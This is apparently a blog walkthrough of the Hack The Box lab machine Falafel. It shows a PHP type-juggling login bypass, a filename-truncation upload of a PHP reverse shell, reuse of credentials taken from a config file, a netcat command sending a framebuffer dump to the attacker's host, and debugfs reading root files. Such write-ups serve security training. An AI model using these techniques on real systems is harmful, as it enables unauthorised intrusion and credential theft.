---
layout: post
title: "HTB-Falafel"
categories: HTB-Walkthrough
---

![falafel](/assets/img/falafel/falafel1.png)



Falafel is on TJNull's list as more challenging than OSCP, but worth the practice.


nmap first:



<h3>Nmap</h3>



```

nmap -sV -Pn --min-rate 10000 10.10.10.73 |tee -a f2.txt


Nmap scan report for 10.10.10.73
Host is up (0.13s latency).
Not shown: 970 closed ports, 28 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.06 seconds
root@kali:~/HTB/vip/falafel# 

```


A quick look at the website:

![website](/assets/img/falafel/falafel-web1.png)


checking out the login page, I test it first with admin/admin. 

```
Wrong identification : admin
```

If I try another, random name jeff, frank, bob for example I get.


```
Try again.
```

This verbose error message has disclosed that `admin` account exists.


############

<h3>Gobuster</h3>


Gobuster can help find directories and files quickly:

```
gobuster dir -u http://10.10.10.73/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x .php,.txt
```

There's a few interesting things:

```

/index.php (Status: 200)
/images (Status: 301)
/login.php (Status: 200)
/profile.php (Status: 302)
/uploads (Status: 301)
/header.php (Status: 200)
/assets (Status: 301)
/footer.php (Status: 200)
/upload.php (Status: 302)
/css (Status: 301)
/style.php (Status: 200)
/js (Status: 301)
/logout.php (Status: 302)
/robots.txt (Status: 200)
/cyberlaw.txt (Status: 200)
/connection.php (Status: 200)
/server-status (Status: 403)

```




<h3>PHP Type-Juggling</h3>


/cyberlaw.txt has an interesting message from the admin.

![cyberlaw](/assets/img/falafel/fl-cyberlawtxt.png)



Trying the login again with `chris` we find that this account also exists.

```
Wrong identification : chris
```



The message is very interesting, It seems to refer to a php password bypass of some sort.


Some research into php password vulnerabilities eventually leads me to php `type-juggling` or `type-coercion`


[OWASP](https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf) have a helpful pdf to check out.

[This interesting site](https://medium.com/@Asm0d3us/part-1-php-tricks-in-web-ctf-challenges-e1981475b3e4) has a good relevant section.

[This site](https://www.whitehatsec.com/blog/magic-hashes/) goes into detail about the target's vulnerability.

It is possible that chris has exploited the loose comparison (==) of the password md5 hash with 0.
In loose comparison only `value` is checked, not the `type` of the variable.

`240610708` has its md5 hash starting with `0e`, 

the whole hash will be treated as `== 0`

#######

Trying this with admin's account is successful, admin/240610708 works, and we reach the upload page.


![upload](/assets/img/falafel/fl-upload.png)


We have to upload an image file, 

A test upload of a .png file was successful:

![ninjapng](/assets/img/falafel/fl-upload1.png)

The file is saved to:

```
http://10.10.10.73/uploads/0318-1638_8dc346ae523c346b/ninja.png
```

And we can view the image OK.


![ninja](/assets/img/falafel/fl-ninjapng.png)



#########


<h3>Long Filename Upload Limit</h3>


What followed was a series of failures...

I spent a long time trying different techniques to get a reverse shell to upload, then execute.

I got a hint on how to proceed when I clicked admin's `profile` link.

![limits](/assets/img/falafel/fl-knowyourlimits.png)


There is a limit on how long a filename can be, any characters after that would be truncated.

I could call a php reverse shell something really long, with the extension `.php.png`
If the name is long enough the file could bypass file-type restrictions because of the `.png`
but then have that part of the extension cut off because of the filename length...leaving an executable `.php` file on the server.

First I did:

```
python -c 'print "A" *255'
```

and got:
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Then copied it to clipboard, to paste as a filename:
```
touch AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.png
```

This failed, `too long`.

I reduced it to 250:
```
touch AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.png
```

When I uploaded it, it was successful, but shortened by the server:

![toolong](/assets/img/falafel/fl-toolong.png)



I copied and pasted its new, shortened name, and counted the characters.

```

echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" |wc -c
237

```

So the name and extension must match 237 characters, with `.png` exceeding the limit.


I got a listener started:
```
nc -nlvp 6969
```

The file was uploaded successfully

![success](/assets/img/falafel/fl-exploit-success.png)


I could browse to activate it on:
```
http://10.10.10.73//uploads/0318-1811_418f124e5b3efb02/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php
```

```

listening on [any] 6969 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.73] 46442
Linux falafel 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 18:11:46 up 17:02,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      01:09   17:02m  0.05s  0.04s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 

```

Make the shell better:

```

python3 -m 'import pty;pty.spawn("/bin/bash")'

CTRL^Z 
stty raw -echo 
fg

```



<h3>Privilege Escalation</h3>



Enumerating the web server first.

```

www-data@falafel:/var/www/html$ ls
assets          cyberlaw.txt  images     login_logic.php  style.php
authorized.php  footer.php    index.php  logout.php       upload.php
connection.php  header.php    js         profile.php      uploads
css             icon.png      login.php  robots.txt

```


`cat connection.php`

```

<?php
   define('DB_SERVER', 'localhost:3306');
   define('DB_USERNAME', 'moshe');
   define('DB_PASSWORD', 'falafelIsReallyTasty');
   define('DB_DATABASE', 'falafel');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
   // Check connection
   if (mysqli_connect_errno())
   {
      echo "Failed to connect to MySQL: " . mysqli_connect_error();
   }
?>

```

Found some creds, they're for the database, but might well work through the ssh port.

`moshe/falafelIsReallyTasty`


```

ssh moshe@10.10.10.73
The authenticity of host '10.10.10.73 (10.10.10.73)' can't be established.
ECDSA key fingerprint is SHA256:XPYifpo9zwt53hU1RwUWqFvOB3TlCtyA1PfM9frNWSw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.73' (ECDSA) to the list of known hosts.
moshe@10.10.10.73's password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Mon Feb  5 23:35:10 2018 from 10.10.14.2
$ 

```

```
$ cat /home/moshe/user.txt                                                                                         
c8xxxxxxxxxxxxxxxxxxxxxxxxxxxxd3                                                                                   
$  
```




```

$ w                                                                                                                
 18:40:51 up 17:31,  2 users,  load average: 0.28, 0.11, 0.04                                                      
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                                                
yossi    tty1                      01:09   17:31m  0.05s  0.04s -bash                                              
moshe    pts/1    10.10.14.7       18:25    0.00s  0.00s  0.00s w

```

user yossi is also logged in?

```
id
uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)
```

moshe has membership of lots of groups.

[This site](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe) demonstrates how to use certain groups to escalate privileges.

A relevent section is pictured below.

![videogroup](/assets/img/falafel/fl-videogroup.png)


Use
 ```
cat /dev/fb0 > screen.raw
```

to retrieve the data, and get the resolution with

```
cat /sys/class/graphics/fb0/virtual_size

1176,885
```

copy the file back to Kali for processing.

on falafel do:
```
nc 10.10.14.7 9999 < screen.raw  
```

on Kali do:
```
nc -nlvp 9999 > screen.raw
```

[This site](https://www.cnx-software.com/2010/07/18/how-to-do-a-framebuffer-screenshot/) gives a perl script to process the screenshot.


Copy the perl script and follow the instructions.

```
perl iraw2png.pl 1176 885 < screen.raw > screenshot.png
```

We've got yossi's password!


![screen](/assets/img/falafel/fl-screen.png)



##################



yossi/MoshePlzStopHackingMe!


##################


`su yossi`


##################

```

yossi@falafel:~$ id
uid=1000(yossi) gid=1000(yossi) groups=1000(yossi),4(adm),6(disk),24(cdrom),30(dip),46(plugdev),117(lpadmin),118(sambashare)

```

Revisit the website that goes through exploiting certain groups for privilege escalation.

![diskgroup](/assets/img/falafel/fl-diskgroup.png)


```

yossi@falafel:~$ ls /dev/sda*
/dev/sda  /dev/sda1  /dev/sda2  /dev/sda5

```

use the `debugfs` command to get the root flag.

```

yossi@falafel:~$ debugfs /dev/sda1
debugfs 1.42.13 (17-May-2015)
debugfs:  cd /root
debugfs:  ls
debugfs:  cat /root/root.txt
23xxxxxxxxxxxxxxxxxxxxxxxxxxxxa1
debugfs:  

```


:)


